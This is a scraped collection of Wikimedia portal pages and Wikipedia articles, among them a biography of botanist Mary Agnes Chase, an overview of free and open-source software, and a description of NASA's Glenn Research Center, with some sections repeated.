the free library of 2300+ functions that anyone can edit.




WELCOME!

Wikifunctions is a Wikimedia project for everyone to collaboratively create and maintain a library of code functions to support the Wikimedia projects and beyond, in the world's natural and programming languages.

A "function" is a sequence of programming instructions that makes a calculation based on data you provide. Functions can answer questions, such as how many days have passed between two dates, or the distance between two cities.

We are currently primarily focused on functions related to Wikidata Lexemes. The Lexicographical data from Wikidata and functions to process it are essential for the goal of an Abstract Wikipedia. A tutorial on how Wikifunctions can be used with Wikidata right now is available.

META-WIKI

Welcome to Meta-Wiki, the global community site for the Wikimedia Foundation's projects and related projects, from coordination and documentation to planning and analysis.

Other meta-focused wikis such as Wikimedia Outreach are specialized projects that have their roots in Meta-Wiki. Related discussions also take place on Wikimedia mailing lists (particularly wikimedia-l, with its low-traffic equivalent WikimediaAnnounce), IRC channels on Libera, individual wikis of Wikimedia affiliates, and other places.

DISTINGUISHED AUTHOR

Mary Agnes Chase
1869–1963. Standard IPNI form: Chase

Mary Agnes Chase, née Merrill, was an American botanist who worked at the U.S. Department of Agriculture and the Smithsonian Institution. She is considered one of the world's outstanding agrostologists and is known for her work on the study of grasses, and also for her work as a suffragist. Chase was born in Iroquois County, Illinois and held no formal education beyond grammar school. That aside, she made significant contributions to the field of botany, authored over 70 scientific publications, and was conferred with an honorary doctorate in science from the University of Illinois. She specialized in the study of grasses and conducted extensive field work in North- as well as and South America. Her Smithsonian Field Books collection from 1897 to 1959 is archived in the Smithsonian Institution Archives.

In 1901, Chase became a botanical assistant at the Field Museum of Natural History under Charles Frederick Millspaugh, where her work was featured in two museum publications: Plantae Utowanae (1900) and Plantae Yucatanae (1904). Two years later, Chase joined the U.S. Department of Agriculture (USDA) as a botanical illustrator and eventually became a scientific assistant in systematic agrostology (1907), assistant botanist (1923), and associate botanist (1925), all under Albert Spear Hitchcock. Chase worked with Hitchcock for almost twenty years, collaborating closely and also publishing, for instance The North American Species of Panicum (1910).

Following Hitchcock's death in 1936, Chase succeeded him to become senior botanist in charge of systematic agrostology and custodian of the Section of Grasses, Division of Plants at the United States National Museum (USNM). Chase retired from the USDA in 1939, but continued her work as custodian of the USNM grass herbarium until her death in 1963. She was an Honorary Fellow of the Smithsonian Institution (1959) and Fellow of the Linnean Society of London (1961). Agnesia is named in her honour (a monotypic genus of herbaceous South American bamboo in the grass family).

Chase experienced discrimination based on her gender in the scientific field, for example, being excluded from expeditions to Panama in 1911 and 1912 because the expedition's benefactors feared the presence of women researchers would distract men. During World War I, Chase marched with Alice Paul and was jailed several times for her activities. In 1918, she was arrested at the Silent Sentinels rally picketing the White House; she refused bail and was held for 10 days, where she instigated a hunger-strike and was force-fed. The USDA accused her of "conduct unbecoming a government employee," but Hitchcock helped her keep her job. Chase was also an active member of the National Association for the Advancement of Colored People (NAACP).

Welcome to Meta-Wiki, the global community site for the Wikimedia Foundation's projects and related projects, from coordination and documentation to planning and analysis.

Other meta-focused wikis such as Wikimedia Outreach are specialized projects that have their roots in Meta-Wiki. Related discussions also take place on Wikimedia mailing lists (particularly wikimedia-l, with its low-traffic equivalent WikimediaAnnounce), IRC channels on Libera, individual wikis of Wikimedia affiliates, and other places.

WIKIPEDIA STILL CAN'T BE SOLD.

[edit]

Thank you for considering a donation to the Wikimedia Foundation.

DISTINGUISHED AUTHOR

Mary Agnes Chase
1869–1963. Standard IPNI form: Chase

Mary Agnes Chase, née Merrill, was an American botanist who worked at the U.S. Department of Agriculture and the Smithsonian Institution. She is considered one of the world's outstanding agrostologists and is known for her work on the study of grasses, and also for her work as a suffragist. Chase was born in Iroquois County, Illinois and held no formal education beyond grammar school. That aside, she made significant contributions to the field of botany, authored over 70 scientific publications, and was conferred with an honorary doctorate in science from the University of Illinois. She specialized in the study of grasses and conducted extensive field work in North- as well as and South America. Her Smithsonian Field Books collection from 1897 to 1959 is archived in the Smithsonian Institution Archives.

In 1901, Chase became a botanical assistant at the Field Museum of Natural History under Charles Frederick Millspaugh, where her work was featured in two museum publications: Plantae Utowanae (1900) and Plantae Yucatanae (1904). Two years later, Chase joined the U.S. Department of Agriculture (USDA) as a botanical illustrator and eventually became a scientific assistant in systematic agrostology (1907), assistant botanist (1923), and associate botanist (1925), all under Albert Spear Hitchcock. Chase worked with Hitchcock for almost twenty years, collaborating closely and also publishing, for instance The North American Species of Panicum (1910).

Following Hitchcock's death in 1936, Chase succeeded him to become senior botanist in charge of systematic agrostology and custodian of the Section of Grasses, Division of Plants at the United States National Museum (USNM). Chase retired from the USDA in 1939, but continued her work as custodian of the USNM grass herbarium until her death in 1963. She was an Honorary Fellow of the Smithsonian Institution (1959) and Fellow of the Linnean Society of London (1961). Agnesia is named in her honour (a monotypic genus of herbaceous South American bamboo in the grass family).

Chase experienced discrimination based on her gender in the scientific field, for example, being excluded from expeditions to Panama in 1911 and 1912 because the expedition's benefactors feared the presence of women researchers would distract men. During World War I, Chase marched with Alice Paul and was jailed several times for her activities. In 1918, she was arrested at the Silent Sentinels rally picketing the White House; she refused bail and was held for 10 days, where she instigated a hunger-strike and was force-fed. The USDA accused her of "conduct unbecoming a government employee," but Hitchcock helped her keep her job. Chase was also an active member of the National Association for the Advancement of Colored People (NAACP).

From Wikifunctions


Welcome to Wikifunctions

the free library of 2300+ functions that anyone can edit.




WELCOME!

Wikifunctions is a Wikimedia project for everyone to collaboratively create and maintain a library of code functions to support the Wikimedia projects and beyond, in the world's natural and programming languages.

A "function" is a sequence of programming instructions that makes a calculation based on data you provide. Functions can answer questions, such as how many days have passed between two dates, or the distance between two cities.

We are currently primarily focused on functions related to Wikidata Lexemes. The Lexicographical data from Wikidata and functions to process it are essential for the goal of an Abstract Wikipedia. A tutorial on how Wikifunctions can be used with Wikidata right now is available.

Wikimania is the annual conference celebrating all the free knowledge projects hosted by the Wikimedia Foundation – Wikimedia Commons, MediaWiki, Meta-Wiki, Wikibooks, Wikidata, Wikinews, Wikipedia, Wikiquote, Wikisource, Wikispecies, Wikiversity, Wikivoyage, Wiktionary and Wikifunctions – with four days of conferences, discussions, meetups, training, and workshops. Hundreds of volunteers and Free Knowledge leaders from around the world gather to discuss issues, report on new projects and approaches, and exchange ideas.


Wikimania 2025, the 20th edition of this annual event, will happen in the city of Nairobi, Kenya with online/ virtual conference setup on 6th to 9th August 2025 and with pre-conference activities on 5th August. It will be hosted by a collaboration among the Wikimedia volunteers and user groups of East Africa (EARTHub) and the Wikimedia Foundation.


This edition marks a great milestone as it also celebrates Wikimania's 20th anniversary.




If you are looking for travel information, you can visit the Wikivoyage pages of Nairobi, Kenya or East Africa.

Quote of the day

 

Civilization, as we know it, is a movement and not a condition, a voyage and not a harbour. No known civilization has, ever reached the goal of civilization yet. There has never been a communion of saints on earth. In the least uncivilized society at its least uncivilized moment, the vast majority of its members have remained very near indeed to the primitive human level. And no society has ever been secure of holding such ground as it has managed to gain in its spiritual advance. ~ Arnold J. Toynbee ~

 

There is a page for each month where previous "Quotes of the Day" for each date are listed, and where registered users can make suggestions or rank suggestions for upcoming dates. The Quotes of the Year page and other archives contain more extensive listings of quotes that have already been used. See also the QOTD by month and email options.

Wikisource – The Free Library – is a Wikimedia Foundation project to create a growing free content library of source texts, as well as translations of source texts in any language.


APRIL’S FEATURED TEXT

Grab a download!

Sophocles' King Oedipus (1928) is a modern English translation with music by the Irish poet and playwright William Butler Yeats, who says of his translation: "This version of Sophocles' play was written for Dublin players, for Dublin liturgical singers, for a small auditorium, for a chorus that must stand stock still where the orchestra are accustomed to put their chairs, for an audience where nobody comes for self­-improvement or for anything but emotion. In other words, I put readers and scholars out of my mind and wrote to be sung and spoken." The Wikisource copy has players embedded for listening to the musical passages.

The Yeats translation formed the basis of the Canadian Stratford Festival production in 1956 under Tyrone Guthrie, who then directed a film adaptation released the following year.

Oedipus. Children, descendants of old Cad­mus, why do you come before me, why do you carry the branches of suppliants, while the city smokes with incense and murmurs with prayer and lamentation? I would not learn from any mouth but yours, old man, therefore I question you myself. Do you know of anything that I can do and have not done? How can I, being the man I am, being King Oedipus, do other than all I know? I were indeed hard of heart did I not pity such suppliants.

Priest. Oedipus, King of my country, you can see our ages who are before your door; some it may be too young for such a journey, and some too old, Priests of Zeus such as I, and these chosen young men; while the rest of the people crowd the market-places with their suppliant branches, for the city stumbles towards death, hardly able to raise up its head. A blight has fallen upon the fruitful blossoms of the land.

Outreach. The Wikimedia way.


Outreach wiki serves as a home for several outreach and collaboration initiatives. It's a bookshelf, a collection of best practices, and a coordination point for any activity that is directed to the public, to cultural institutions, or to education programs.

Our mission is to recruit and support new Wikimedians and to build strong relationships with cultural and educational partners. We need your help in making this collaborative platform bigger, better, and more useful. There's plenty to do.




GLAM


This project works with galleries, libraries, archives and museums to bring cultural content online.

Software whose source code is available and which is permissively licensed

Free and open-source software (FOSS) is software available under a license that grants users the right to use, modify, and distribute the software – modified or not – to everyone free of charge. FOSS is an inclusive umbrella term encompassing free software and open-source software.[a][1] The rights guaranteed by FOSS originate from the "Four Essential Freedoms" of The Free Software Definition and the criteria of The Open Source Definition.[4][6] All FOSS must have publicly available source code, but not all source-available software is FOSS. FOSS is the opposite of proprietary software, which is licensed restrictively or has undisclosed source code.[4]

The historical precursor to FOSS was the hobbyist and academic public domain software ecosystem of the 1960s to 1980s. Free and open-source operating systems such as Linux distributions and descendants of BSD are widely used, powering millions of servers, desktops, smartphones, and other devices.[9][10] Free-software licenses and open-source licenses have been adopted by many software packages. Reasons for using FOSS include decreased software costs, increased security against malware, stability, privacy, opportunities for educational usage, and giving users more control over their own hardware.

The free software movement and the open-source software movement are online social movements behind widespread production, adoption and promotion of FOSS, with the former preferring to use the equivalent term free/libre and open-source software (FLOSS). FOSS is supported by a loosely associated movement of multiple organizations, foundations, communities and individuals who share basic philosophical perspectives and collaborate practically, but may diverge in detail questions.




OVERVIEW

[edit]
Further information: Alternative terms for free software

"Free and open-source software" (FOSS) is an umbrella term for software that is considered free software and/or open-source software.[1] The precise definition of the terms "free software" and "open-source software" applies them to any software distributed under terms that allow users to use, modify, and redistribute said software in any manner they see fit, without requiring that they pay the author(s) of the software a royalty or fee for engaging in the listed activities.[11]

Although there is an almost complete overlap between free-software licenses and open-source-software licenses, there is a strong philosophical disagreement between the advocates of these two positions. The terminology of FOSS was created to be a neutral on these philosophical disagreements between the Free Software Foundation (FSF) and Open Source Initiative (OSI) and have a single unified term that could refer to both concepts, although Richard Stallman argues that it fails to be neutral unlike the similar term; "Free/Libre and Open Source Software" (FLOSS).[12]


FREE SOFTWARE

[edit]
Main article: Free software

Richard Stallman's The Free Software Definition, adopted by the FSF, defines free software as a matter of liberty, not price,[13][14] and that which upholds the Four Essential Freedoms. The earliest known publication of this definition of his free software definition was in the February 1986 edition[15] of the FSF's now-discontinued GNU's Bulletin publication. The canonical source for the document is in the philosophy section of the GNU Project website. As of August 2017[update], it is published in 40 languages.[16]

FOUR ESSENTIAL FREEDOMS OF FREE SOFTWARE

[edit]

To meet the definition of "free software", the FSF requires the software's licensing respect the civil liberties / human rights of what the FSF calls the software user's "Four Essential Freedoms".[17]

 * The freedom to run the program as you wish, for any purpose (freedom 0).
 * The freedom to study how the program works, and change it so it does your computing as you wish (freedom 1). Access to the source code is a precondition for this.
 * The freedom to redistribute copies so you can help others (freedom 2).
 * The freedom to distribute copies of your modified versions to others (freedom 3). By doing this, you can give the whole community a chance to benefit from your changes. Access to the source code is a precondition for this.[17]


OPEN-SOURCE SOFTWARE

[edit]
Main article: Open-source software

The Open Source Definition is used by the Open Source Initiative (OSI) to determine whether a software license qualifies for the organization's insignia for open-source software. The definition was based on the Debian Free Software Guidelines, written and adapted primarily by Bruce Perens.[18][19] Perens did not base his writing on the Four Essential Freedoms of free software from the Free Software Foundation, which were only later available on the web.[20] Perens subsequently stated that he felt Eric Raymond's promotion of open-source unfairly overshadowed the Free Software Foundation's efforts and reaffirmed his support for free software.[21] In the following 2000s, he spoke about open source again.[22][23]


HISTORY

[edit]
Main article: History of free and open-source software
This section appears to contradict the article History of free and open-source software. Please discuss at the talk page and do not remove this message until the contradictions are resolved. (June 2015)

In the early decades of computing, particularly from the 1950s through the 1970s, software development was largely collaborative. Programs were commonly shared in source code form among academics, researchers, and corporate developers. Most companies at the time made their revenue from hardware sales, and software—including source code—was distributed freely alongside it, often as public-domain software.[24][25]

By the late 1960s and 1970s, a distinct software industry began to emerge. Companies started selling software as a separate product, leading to the use of restrictive licenses and technical measures—such as distributing only binary executables—to limit user access and control. This shift was driven by growing competition and the U.S. government's antitrust scrutiny of bundled software, exemplified by the 1969 antitrust case United States v. IBM.[26]

A key turning point came in 1980 when U.S. copyright law was formally extended to cover computer software.[27][28] This enabled companies like IBM to further enforce closed-source distribution models. In 1983, IBM introduced its "object code only" policy, ceasing the distribution of source code for its system software.[29]

In response to the growing restrictions on software, Richard Stallman launched the GNU Project in 1983 at MIT. His goal was to develop a complete Free software operating system and restore user freedom. The Free Software Foundation (FSF) was established in 1985 to support this mission. Stallman's GNU Manifesto and the Four Essential Freedoms outlined the movement's ethical stance, emphasizing user control over software.[17]

The release of the Linux kernel by Linus Torvalds in 1991, and its relicense under the GNU General Public License (GPL) in 1992, marked a major step toward a fully Free operating system.[30] Other Free software projects like FreeBSD, NetBSD, and OpenBSD also gained traction following the resolution of the USL v. BSDi lawsuit in 1993.

In 1997, Eric Raymond’s essay *The Cathedral and the Bazaar* explored the development model of Free software, influencing Netscape’s decision in 1998 to release the source code for its browser suite. This code base became Mozilla Firefox and Thunderbird.

To broaden business adoption, a group of developers including Raymond, Bruce Perens, Tim O’Reilly, and Linus Torvalds rebranded the Free software movement as “Open Source.” The Open Source Initiative (OSI) was founded in 1998 to promote this new term and emphasize collaborative development benefits over ideology.[31]

Despite initial resistance—such as Microsoft's 2001 claim that "Open-source is an intellectual property destroyer"—FOSS eventually gained widespread acceptance in the corporate world. Companies like Red Hat proved that commercial success and Free software principles could coexist.[32][33][34]

BENEFITS OVER PROPRIETARY SOFTWARE

[edit]

PERSONAL CONTROL, CUSTOMIZABILITY AND FREEDOM

[edit]
See also: Vendor lock-in

Users of FOSS benefit from the Four Essential Freedoms to make unrestricted use of, and to study, copy, modify, and redistribute such software with or without modification. If they would like to change the functionality of software they can bring about changes to the code and, if they wish, distribute such modified versions of the software or often − depending on the software's decision making model and its other users − even push or request such changes to be made via updates to the original software.[35][36][37][38][39]

PRIVACY AND SECURITY

[edit]
See also: Open-source software security, Surveillance capitalism, Global surveillance disclosures (2013–present), and Software update system

Manufacturers of proprietary, closed-source software are sometimes pressured to building in backdoors or other covert, undesired features into their software.[40][41][42][43] Instead of having to trust software vendors, users of FOSS can inspect and verify the source code themselves and can put trust on a community of volunteers and users.[39] As proprietary code is typically hidden from public view, only the vendors themselves and hackers may be aware of any vulnerabilities in them[39] while FOSS involves as many people as possible for exposing bugs quickly.[44][45]

LOW COSTS OR NO COSTS

[edit]

FOSS is often free of charge although donations are often encouraged. This also allows users to better test and compare software.[39]

QUALITY, COLLABORATION AND EFFICIENCY

[edit]

FOSS allows for better collaboration among various parties and individuals with the goal of developing the most efficient software for its users or use-cases while proprietary software is typically meant to generate profits. Furthermore, in many cases more organizations and individuals contribute to such projects than to proprietary software.[39] It has been shown that technical superiority is typically the primary reason why companies choose open source software.[39]


DRAWBACKS COMPARED TO PROPRIETARY SOFTWARE

[edit]

SECURITY AND USER-SUPPORT

[edit]
See also: Common good, Public participation, and Proactive cyber defence § Measures

According to Linus's law the more people who can see and test a set of code, the more likely any flaws will be caught and fixed quickly. However, this does not guarantee a high level of participation. Having a grouping of full-time professionals behind a commercial product can in some cases be superior to FOSS.[39][44][46]

Furthermore, publicized source code might make it easier for hackers to find vulnerabilities in it and write exploits. This however assumes that such malicious hackers are more effective than white hat hackers which responsibly disclose or help fix the vulnerabilities, that no code leaks or exfiltrations occur and that reverse engineering of proprietary code is a hindrance of significance for malicious hackers.[44]

HARDWARE AND SOFTWARE COMPATIBILITY

[edit]
Further information: Software incompatibility and System requirements

Sometimes, FOSS is not compatible with proprietary hardware or specific software. This is often due to manufacturers obstructing FOSS such as by not disclosing the interfaces or other specifications needed for members of the FOSS movement to write drivers for their hardware – for instance as they wish customers to run only their own proprietary software or as they might benefit from partnerships.[47][48][49][50][51][52][53]

BUGS AND MISSING FEATURES

[edit]

While FOSS can be superior to proprietary equivalents in terms of software features and stability, in many cases it has more unfixed bugs and missing features when compared to similar commercial software.[54][additional citation(s) needed] This varies per case, and usually depends on the level of interest in a particular project. However, unlike close-sourced software, improvements can be made by anyone who has the motivation, time and skill to do so.[46][additional citation(s) needed]

A common obstacle in FOSS development is the lack of access to some common official standards, due to costly royalties or required non-disclosure agreements (e.g., for the DVD-Video format).[55]

LESS GUARANTEE OF DEVELOPMENT

[edit]

There is often less certainty of FOSS projects gaining the required resources and participation for continued development than commercial software backed by companies.[56][additional citation(s) needed] However, companies also often abolish projects for being unprofitable, yet large companies may rely on, and hence co-develop, open source software.[45] On the other hand, if the vendor of proprietary software ceases development, there are no alternatives; whereas with FOSS, any user who needs it still has the right, and the source-code, to continue to develop it themself, or pay a 3rd party to do so.

MISSING APPLICATIONS

[edit]

As the FOSS operating system distributions of Linux has a lower market share of end users there are also fewer applications available.[57][58]

This list is incomplete; you can help by adding missing items. (July 2017)

Country Description Brazil In 2006, the Brazilian government has simultaneously encouraged the distribution of cheap computers running Linux throughout its poorer communities by subsidizing their purchase with tax breaks.[59] Ecuador In April 2008,[60] Ecuador passed a similar law, Decree 1014, designed to migrate the public sector to Libre Software.[61] France In March 2009, the French Gendarmerie Nationale announced it will totally switch to Ubuntu by 2015. The Gendarmerie began its transition to open source software in 2005 when it replaced Microsoft Office with OpenOffice.org across the entire organization.[62] In September 2012, the French Prime Minister laid down a set of action-oriented recommendations about using open-source in the French public administration.[63] These recommendations are published in a document based on the works of an inter-ministerial group of experts.[64] This document promotes some orientations like establishing an actual convergence on open-source stubs, activating a network of expertise about converging stubs, improving the support of open-source software, contributing to selected stubs, following the big communities, spreading alternatives to the main commercial solutions, tracing the use of open-source and its effects, developing the culture of use of the open-source licenses in the developments of public information systems. One of the aim of this experts groups is also to establish lists of recommended open-source software to use in the French public administration.[65] Germany In the German City of Munich, conversion of 15,000 PCs and laptops from Microsoft Windows-based operating systems to a Debian-based Linux environment called LiMux spanned the ten years of 2003 to 2013. After successful completion of the project, more than 80% of all computers were running Linux.[66] On November 13, 2017, The Register reported that Munich was planning to revert to Windows 10 by 2020.[67] But in 2020, Munich decided to shift back from Microsoft to Linux again.[68] In 2022 Germany launched[69] Open CoDE, its own FOSS repository and forum. India The Government of Kerala, India, announced its official support for free and open-source software in its State IT Policy of 2001,[70][discuss] which was formulated after the first-ever Free software conference in India, Freedom First!, held in July 2001 in Trivandrum, the capital of Kerala. In 2009, Government of Kerala started the International Centre for Free and Open Source Software (ICFOSS).[71] In March 2015 the Indian government announced a policy on adoption of FOSS.[72][73] Italy The Italian military is transitioning to LibreOffice and the OpenDocument Format (ODF). LibreItalia Association announced on September 15, 2015, that the Ministry of Defence would over the next year-and-a-half install this suite of office productivity tools on some 150,000 PC workstations, making it Europe's second-largest LibreOffice implementation.[74] By June 23, 2016, 6,000 stations have been migrated.[75] E-learning military platform.[76][needs update] Jordan In January 2010, the Government of Jordan announced a partnership with Ingres Corporation (now named Actian), an open-source database-management company based in the United States, to promote open-source software use, starting with university systems in Jordan.[77] Malaysia Malaysia launched the "Malaysian Public Sector Open Source Software Program", saving millions on proprietary software licenses until 2008.[78][79] Peru In 2005, the Government of Peru voted to adopt open source across all its bodies.[80] The 2002 response to Microsoft's critique is available online. In the preamble to the bill, the Peruvian government stressed that the choice was made to ensure that key pillars of democracy were safeguarded: "The basic principles which inspire the Bill are linked to the basic guarantees of a state of law."[81] Uganda In September 2014, the Uganda National Information Technology Authority (NITA-U) announced a call for feedback on an Open Source Strategy & Policy[82] at a workshop in conjunction with the ICT Association of Uganda (ICTAU). United States In February 2009, the White House moved its website to Linux servers using Drupal for content management.[83] In August 2016, the United States government announced a new federal source code policy which mandates that at least 20% of custom source code developed by or for any agency of the federal government be released as open-source software (OSS).[84] In addition, the policy requires that all source code be shared between agencies. The public release is under a three-year pilot program and agencies are obliged to collect data on this pilot to gauge its performance. The overall policy aims to reduce duplication, avoid vendor 'lock-in', and stimulate collaborative development. A new website code.gov provides "an online collection of tools, best practices, and schemas to help agencies implement this policy", the policy announcement stated. It also provides the "primary discoverability portal for custom-developed software intended both for Government-wide reuse and for release as OSS".[84] As yet unspecified OSS licenses will be added to the code.[85] Venezuela In 2004, a law in Venezuela (Decree 3390) went into effect, mandating a two-year transition to open source in all public agencies. As of June 2009[update], the transition was still under way.[86][87][needs update]


ADOPTION BY SUPRANATIONAL UNIONS AND INTERNATIONAL ORGANIZATIONS

[edit]

EUROPEAN UNION

[edit]

> "We migrated key functions from Windows to Linux because we needed an operating system that was stable and reliable -- one that would give us in-house control. So if we needed to patch, adjust, or adapt, we could."

Official statement of the United Space Alliance, which manages the computer systems for the International Space Station (ISS), regarding why they chose to switch from Windows to Linux on the ISS.[88][89]

In 2017, the European Commission stated that "EU institutions should become open source software users themselves, even more than they already are" and listed open source software as one of the nine key drivers of innovation, together with big data, mobility, cloud computing and the internet of things.[90]

In 2020, the European Commission adopted its Open Source Strategy 2020-2023,[91] including encouraging sharing and reuse of software and publishing Commission's source code as key objectives. Among concrete actions there is also to set up an Open Source Programme Office in 2020[92] and in 2022 it launched its own FOSS repository https://code.europa.eu/.[93]

In 2021, the Commission Decision on the open source licensing and reuse of Commission software (2021/C 495 I/01)[94] was adopted, under which, as a general principle, the European Commission may release software under EUPL or another FOSS license, if more appropriate. There are exceptions though.

In May 2022,[95] the Expert group on the Interoperability of European Public Services came published 27 recommendations to strengthen the interoperability of public administrations across the EU. These recommendations are to be taken into account later in the same year in Commission's proposal of the "Interoperable Europe Act".


PRODUCTION

[edit]
See also: Open-source software development

Open-source software development (OSSD) is the process by which open-source software is developed. The software's source code is publicly available to be used, modified, and enhanced.[96] Notable examples of open-source software products are Mozilla Firefox, Android, and VLC media player.[97] The development process is typically different from traditional methods such as Waterfall. Instead favoring early releases and community involvement.[97] Agile development strategies are most often employed OSSD, with are characterized by their iterative and incremental frameworks.[98] Open-source software developers will typically use methods such as E-mail, Wikis, web forums, and instant messaging services for communication, as individuals are not typically working in close proximity to one another.[99] Version control systems such as Git are utilized to make code collaboration easier.[97]


ISSUES AND INCIDENTS

While copyright is the primary legal mechanism that FOSS authors use to ensure license compliance for their software, other mechanisms such as legislation, patents, and trademarks have implications as well. In response to legal issues with patents and the Digital Millennium Copyright Act (DMCA), the Free Software Foundation released version 3 of its GNU General Public License (GNU GPLv3) in 2007 that explicitly addressed the DMCA and patent rights.

After the development of the GNU GPLv3 in 2007, the FSF (as the copyright holder of many pieces of the GNU system) updated many[citation needed] of the GNU programs' licenses from GPLv2 to GPLv3. On the other hand, the adoption of the new GPL version was heavily discussed in the FOSS ecosystem,[100] several projects decided against upgrading to GPLv3. For instance the Linux kernel,[101][102] the BusyBox[103][104] project, AdvFS,[105] Blender,[106] and the VLC media player decided against adopting the GPLv3.[107]

Apple, a user of GCC and a heavy user of both DRM and patents, switched the compiler in its Xcode IDE from GCC to Clang, which is another FOSS compiler[108] but is under a permissive license.[109] LWN speculated that Apple was motivated partly by a desire to avoid GPLv3.[108] The Samba project also switched to GPLv3, so Apple replaced Samba in their software suite by a closed-source, proprietary software alternative.[110]


SKEWED PRIORITIZATION, INEFFECTIVENESS AND EGOISM OF DEVELOPERS

[edit]

Leemhuis criticizes the prioritization of skilled developers who − instead of fixing issues in already popular open-source applications and desktop environments − create new, mostly redundant software to gain fame and fortune.[111]

He also criticizes notebook manufacturers for optimizing their own products only privately or creating workarounds instead of helping fix the actual causes of the many issues with Linux on notebooks such as the unnecessary power consumption.[111]


COMMERCIAL OWNERSHIP OF OPEN-SOURCE SOFTWARE

[edit]

Mergers have affected major open-source software. Sun Microsystems (Sun) acquired MySQL AB, owner of the popular open-source MySQL database, in 2008.[112]

Oracle in turn purchased Sun in January 2010, acquiring their copyrights, patents, and trademarks. Thus, Oracle became the owner of both the most popular proprietary database and the most popular open-source database. Oracle's attempts to commercialize the open-source MySQL database have raised concerns in the FOSS community.[113] Partly in response to uncertainty about the future of MySQL, the FOSS community forked the project into new database systems outside of Oracle's control. These include MariaDB, Percona, and Drizzle.[114] All of these have distinct names; they are distinct projects and cannot use the trademarked name MySQL.[115]


LEGAL CASES

[edit]

ORACLE V. GOOGLE

[edit]
Main article: Google LLC v. Oracle America, Inc.

In August 2010, Oracle sued Google, claiming that its use of Java in Android infringed on Oracle's copyrights and patents. In May 2012, the trial judge determined that Google did not infringe on Oracle's patents and ruled that the structure of the Java APIs used by Google was not copyrightable. The jury found that Google infringed a small number of copied files, but the parties stipulated that Google would pay no damages.[116] Oracle appealed to the Federal Circuit, and Google filed a cross-appeal on the literal copying claim.[117]


ECONOMICS

[edit]
Main article: Open source

By defying ownership regulations in the construction and use of information—a key area of contemporary growth—the Free/Open Source Software (FOSS) movement counters neoliberalism and privatization in general.[118][119]

By realizing the historical potential of an "economy of abundance" for the new digital world, FOSS may lay down a plan for political resistance or show the way towards a potential transformation of capitalism.[119]

According to Yochai Benkler, Jack N. and Lillian R. Berkman Professor for Entrepreneurial Legal Studies at Harvard Law School, free software is the most visible part of a new economy of commons-based peer production of information, knowledge, and culture. As examples, he cites a variety of FOSS projects, including both free software and open-source.[120]

NOTES

[edit]
 1. ^ FOSS is an inclusive term that covers both free software and open-source software,[1] which despite describing similar development models, have differing cultures and philosophical backgrounds.[2] Free refers to the users' freedom to copy and re-use the software. The Free Software Foundation, an organization that advocates the free software model, suggests that to understand the concept, one should "think of free as in free speech, not as in free beer". (See "The Free Software Definition". GNU. Retrieved 4 February 2010.) Free software focuses on the fundamental freedoms it gives to users, whereas open source software focuses on the perceived strengths of its peer-to-peer development model.[3]

[...]The real outcomes, however, are this: BusyBox will be GPLv2 only starting with the next release.

It is our belief that changing our licensing terms to GPL version 3 would currently not be in the best interest of our community as a whole. Consequently, we plan to keep distributing future versions of VLC media player under the terms of the GPL version 2.

NASA John H. Glenn Research Center at Lewis Field is a NASA center within the cities of Brook Park and Cleveland between Cleveland Hopkins International Airport and the Rocky River Reservation of Cleveland Metroparks, with a subsidiary facility in Sandusky, Ohio. Its director is James A. Kenyon. Glenn Research Center is one of ten major NASA facilities, whose primary mission is to develop science and technology for use in aeronautics and space. As of May 2012[update], it employed about 1,650 civil servants and 1,850 support contractors on or near its site.

In 2010, the formerly on-site NASA Visitors Center moved to the Great Lakes Science Center in the North Coast Harbor area of downtown Cleveland.


HISTORY

[edit]
The drafting room at the Aircraft Engine Research Laboratory in 1942.

The installation was established in 1942 as part of the National Advisory Committee for Aeronautics (NACA) and was later incorporated into the National Aeronautics and Space Administration as a laboratory for aircraft engine research.

It was first named the Aircraft Engine Research Laboratory after funding was approved in June 1940. It was renamed the Flight Propulsion Research Laboratory in 1947, the Lewis Flight Propulsion Laboratory (LFPL) in 1948 (after George W. Lewis, the head of NACA from 1919 to 1947), and the NASA Lewis Research Center in 1958.

On March 1, 1999, the center was officially renamed the NASA John H. Glenn Research Center at Lewis Field, in honor of John Glenn, who was a fighter pilot, astronaut (the first American to orbit the Earth) and a politician.

As early as 1951, researchers at the LFPL were studying the combustion processes in liquid rocket engines.[1]


FACILITIES

[edit]


NEIL A. ARMSTRONG TEST FACILITY

[edit]
GRC Armstrong Spacecraft Propulsion Facility (B-2)

The 6,400-acre (2,600 ha) NASA John H. Glenn Research Center at the Neil A. Armstrong Test Facility or just Neil A. Armstrong Test Facility, formerly the NASA John H. Glenn Research Center at Plum Brook Station or just Plum Brook Station, in southern Erie County, Ohio, near Sandusky, is also part of Glenn (41°20′59.4″N 82°39′01.8″W﻿ / ﻿41.349833°N 82.650500°W﻿ / 41.349833; -82.650500).[2] It is located about 50 miles (80 km) from the main campus. It specializes in very large scale tests that would be hazardous on the main campus.[3]

As of 2015,[update] the station consisted of five major facilities:[4]

 * B-2 Spacecraft Propulsion Research Facility
 * Combined Effects Chamber
 * Cryogenic Components Laboratory: slated for demolition[citation needed]
 * Hypersonic Test Facility
 * Space Power Facility

The Plum Brook Reactor was decontaminated and decommissioned under a 2008 cost-plus-fee contract valued at more than $33.5 million.[5]

In 2019 the U.S. senators from Ohio, Rob Portman and Sherrod Brown, proposed to rename Plum Brook Station after Neil Armstrong.[6] The legislation[7] was signed into law on December 30, 2020, and Plum Brook Station was renamed the Neil A. Armstrong Test Facility.[8][2]

B-2 SPACECRAFT PROPULSION RESEARCH FACILITY

[edit]



Main article: Space Power Facility

The B-2 Spacecraft Propulsion Research Facility is the world's only facility capable of testing full-scale, upper-stage launch vehicles and rocket engines under simulated high-altitude conditions. The Space Power Facility houses the world's largest space environment vacuum chamber.[9]


ICING RESEARCH TUNNEL

[edit]

The icing Research Tunnel is a wind tunnel capable of simulating atmospheric icing condition to test the effect of ice accretion on aircraft wings and body as well as to test anti-icing systems for aircraft.


ZERO GRAVITY RESEARCH FACILITY

[edit]
Main article: Zero Gravity Research Facility

The Zero Gravity Research Facility is a vertical vacuum chamber used for dropping experiment payloads for testing in microgravity. It enables the investigation of the behavior of components, systems, liquids, gases, and combustion when dropped in vacuum.

The facility consists of a concrete-lined shaft, 28 feet (8.5 m) in diameter, that extends 510 feet (160 m) below ground level. An aluminum vacuum chamber, 20 feet (6.1 m) in diameter and 470 feet (140 m) high, is contained within the concrete shaft. The pressure in this vacuum chamber is reduced to 13.3 newtons per square meter (1.3×10−4atm) before use.

The facility also includes a smaller drop tower with a free fall time of 2.2 seconds and a much lower cost per drop. It is used for the Dropping in a Microgravity Environment (DIME) and What if No Gravity (WING) educational programs.

